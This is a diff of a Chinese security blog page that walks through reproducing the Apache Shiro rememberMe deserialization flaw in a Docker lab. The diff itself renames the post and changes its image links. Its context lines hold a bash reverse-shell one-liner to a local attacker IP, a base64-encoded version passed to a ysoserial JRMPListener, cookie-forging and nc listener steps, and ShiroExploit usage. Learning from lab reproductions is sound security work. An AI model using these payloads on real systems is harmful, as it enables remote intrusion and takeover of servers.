@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="apache shiro 反序列化复现, CTF,渗透测试,web安全,内网渗透,Python,漏洞复现,工具分享">
+    <meta name="keywords" content="shiro 反序列化复现, CTF,渗透测试,web安全,内网渗透,Python,漏洞复现,工具分享">
     <meta name="description" content="专注于web安全、内网渗透,分享知识,分享菜鸡日常">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>apache shiro 反序列化复现 | salute0&#39;s blogs</title>
+    <title>shiro 反序列化复现 | salute0&#39;s blogs</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -313,12 +313,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">apache shiro 反序列化复现</h1>
+                    <h1 class="description center-align post-title">shiro 反序列化复现</h1>
                 </div>
             </div>
         </div>
@@ -477,7 +477,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    634
+                    553
                 </div>
                 
 
@@ -514,14 +514,14 @@ docker run -d -p 8082:8080 medicean/vulapps:s_shiro_1   #启动docker镜像
 <p>nc</p>
 <p>ShiroExploit.V2.0</p>
 <p>我们访问192.168.3.125:8082输入用户名密码（随便输入）并且勾选上remember me利用burp抓包</p>
-<p>![](../images/apache shiro反序列化/1.png)</p>
+<p><img src="../images/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png"></p>
 <p>我们看响应包发现rememberMe=deleteMe由此证明存在shiro反序列化漏洞</p>
-<p>![](../images/apache shiro反序列化/2.png)</p>
+<p><img src="../images/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png"></p>
 <h3 id="我们首先利用纯手工实现shiro序列化反弹shell"><a href="#我们首先利用纯手工实现shiro序列化反弹shell" class="headerlink" title="我们首先利用纯手工实现shiro序列化反弹shell"></a>我们首先利用纯手工实现shiro序列化反弹shell</h3><h4 id="1-制作反弹shell代码"><a href="#1-制作反弹shell代码" class="headerlink" title="1.制作反弹shell代码"></a>1.制作反弹shell代码</h4><p>我们先生成初始反弹shell代码</p>
 <pre class=" language-sh"><code class="language-sh">bash -i >& /dev/tcp/192.168.3.118/888 0>&1
 </code></pre>
 <p>接着我们在<a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html%E8%BF%9B%E8%A1%8C%E7%BC%96%E7%A0%81">http://www.jackson-t.ca/runtime-exec-payloads.html进行编码</a></p>
-<p>![](../images/apache shiro反序列化/3.png)</p>
+<p><img src="../images/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png"></p>
 <h4 id="2-使用ysoserial中JRMP监听模块，监听666端口"><a href="#2-使用ysoserial中JRMP监听模块，监听666端口" class="headerlink" title="2.使用ysoserial中JRMP监听模块，监听666端口"></a>2.使用ysoserial中JRMP监听模块，监听666端口</h4><p>进入ysoserial.jar所在目录，执行以下代码，监听666端口</p>
 <pre class=" language-sh"><code class="language-sh">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 666 CommonsCollections4 '编码内容'
 </code></pre>
@@ -531,7 +531,7 @@ docker run -d -p 8082:8080 medicean/vulapps:s_shiro_1   #启动docker镜像
 <p>此时我们完整的执行代码就是</p>
 <pre class=" language-sh"><code class="language-sh">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 666 CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTE4Lzg4OCAwPiYx}|{base64,-d}|{bash,-i}'
 </code></pre>
-<p>![](../images/apache shiro反序列化/4.png)</p>
+<p><img src="../images/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png"></p>
 <h4 id="3-生成cookie"><a href="#3-生成cookie" class="headerlink" title="3.生成cookie"></a>3.生成cookie</h4><p>前提：我们python必须安装了pycrypto库。没安装的可以执行以下命令安装</p>
 <pre class=" language-python"><code class="language-python">pip install pycrypto
 </code></pre>
@@ -541,19 +541,19 @@ docker run -d -p 8082:8080 medicean/vulapps:s_shiro_1   #启动docker镜像
 <p>此时我们的攻击机执行的代码是</p>
 <pre class=" language-sh"><code class="language-sh">python exp.py 192.168.3.118:666
 </code></pre>
-<p>![](../images/apache shiro反序列化/5.png)</p>
+<p><img src="../images/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png"></p>
 <p>我们可以看见此时已经生成了含有攻击代码的cookie</p>
 <h4 id="4-nc监听，burp修改cookie"><a href="#4-nc监听，burp修改cookie" class="headerlink" title="4.nc监听，burp修改cookie"></a>4.nc监听，burp修改cookie</h4><p>我们利用nc开始监听我们最初反弹shell的端口</p>
 <pre class=" language-sh"><code class="language-sh">nc -lvvp 888
 </code></pre>
-<p>接着我们利用burp修改cookie![](../images/apache shiro反序列化/6.png)</p>
+<p>接着我们利用burp修改cookie<img src="../images/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png"></p>
 <p>最后发包就可以成功反弹shell</p>
-<p>![](../images/apache shiro反序列化/7.png)</p>
+<p><img src="../images/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png"></p>
 <h3 id="我们接下来使用工具自动化完成shiro反序列化利用"><a href="#我们接下来使用工具自动化完成shiro反序列化利用" class="headerlink" title="我们接下来使用工具自动化完成shiro反序列化利用"></a>我们接下来使用工具自动化完成shiro反序列化利用</h3><p>我们使用ShiroExploit.V2.0，双击ShiroExploit.jar打开工具</p>
-<p>![](../images/apache shiro反序列化/8.png)</p>
+<p><img src="../images/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png"></p>
 <p>我们在url处输入存在shiro反序列化漏洞的url地址，选择命令执行。不断切换我们的列（PAYLOAD）尝试哪个payload可以利用，最后我们输入我们要执行的命令即可进行远程命令执行。</p>
 <p>这里我环境的payload是CommonsCollections2</p>
-<p>![](../images/apache shiro反序列化/9.png)</p>
+<p><img src="../images/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png"></p>
 
                 
             </div>
@@ -1070,9 +1070,9 @@ docker run -d -p 8082:8080 medicean/vulapps:s_shiro_1   #启动docker镜像
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="apache shiro 反序列化复现">
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="shiro 反序列化复现">
                         
-                        <span class="card-title">apache shiro 反序列化复现</span>
+                        <span class="card-title">shiro 反序列化复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1364,7 +1364,7 @@ docker run -d -p 8082:8080 medicean/vulapps:s_shiro_1   #启动docker镜像
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">3k</span>
+                        class="white-color">2.9k</span>
             
             
             
